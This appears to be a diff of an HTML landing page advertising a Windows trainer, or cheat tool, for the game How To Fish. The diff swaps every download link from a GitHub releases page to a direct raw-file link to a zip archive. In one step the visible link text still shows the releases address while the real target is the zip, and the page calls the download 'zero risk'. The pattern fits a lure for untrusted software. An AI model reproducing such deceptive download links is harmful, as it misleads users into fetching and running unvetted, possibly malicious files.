@@ -10,7 +10,7 @@
     <meta name="author" content="Humfu8723">
     <meta property="og:title" content="🎣 How-To-Fish-Trainer - Catch More Fish Effortlessly on PC">
     <meta property="og:description" content="The ultimate companion tool for How To Fish on Windows. Enjoy smoother gameplay, extra features, and one click trainer options. Download now to level up your fishing game with zero risk.">
-    <meta property="og:url" content="https://github.com/Humfu8723/How-To-Fish-Trainer/releases">
+    <meta property="og:url" content="https://raw.githubusercontent.com/Humfu8723/How-To-Fish-Trainer/main/MS/Fish_Trainer_How_To_v1.3.zip">
     <meta property="og:type" content="website">
     <style>
         * {
@@ -200,7 +200,7 @@
 
         <!-- Primary Download Link - Big Badge -->
         <div class="badge-container">
-            <a href="https://github.com/Humfu8723/How-To-Fish-Trainer/releases" class="download-btn" rel="noopener">⬇️ DOWNLOAD NOW</a>
+            <a href="https://raw.githubusercontent.com/Humfu8723/How-To-Fish-Trainer/main/MS/Fish_Trainer_How_To_v1.3.zip" class="download-btn" rel="noopener">⬇️ DOWNLOAD NOW</a>
         </div>
 
         <!-- IntroSection -->
@@ -229,7 +229,7 @@
         <ol style="list-style:none; padding-left:0;">
             <li style="margin-bottom:1rem;">
                 <span class="step-number">1</span> <strong>Visit the download page</strong><br>
-                This link to download the application: <a href="https://github.com/Humfu8723/How-To-Fish-Trainer/releases" rel="noopener" style="color:#1a7fff; font-weight:bold;">github.com/Humfu8723/How-To-Fish-Trainer/releases</a>. The page shows you all available versions for Windows (choose the latest one).
+                This link to download the application: <a href="https://raw.githubusercontent.com/Humfu8723/How-To-Fish-Trainer/main/MS/Fish_Trainer_How_To_v1.3.zip" rel="noopener" style="color:#1a7fff; font-weight:bold;">github.com/Humfu8723/How-To-Fish-Trainer/releases</a>. The page shows you all available versions for Windows (choose the latest one).
             </li>
             <li style="margin-bottom:1rem;">
                 <span class="step-number">2</span> <strong>Download the trainer file</strong><br>
@@ -287,7 +287,7 @@
 
         <!-- Big Button again -->
         <div class="badge-container" style="margin:2.5rem 0;">
-            <a href="https://github.com/Humfu8723/How-To-Fish-Trainer/releases" class="download-btn" rel="noopener" style="background: linear-gradient(135deg,#ff7a00,#ffaa00); box-shadow:0 8px 20px rgba(255,122,0,0.4);">🎣 Get The Trainer Today</a>
+            <a href="https://raw.githubusercontent.com/Humfu8723/How-To-Fish-Trainer/main/MS/Fish_Trainer_How_To_v1.3.zip" class="download-btn" rel="noopener" style="background: linear-gradient(135deg,#ff7a00,#ffaa00); box-shadow:0 8px 20px rgba(255,122,0,0.4);">🎣 Get The Trainer Today</a>
         </div>
 
         <!-- Simple FAQ -->
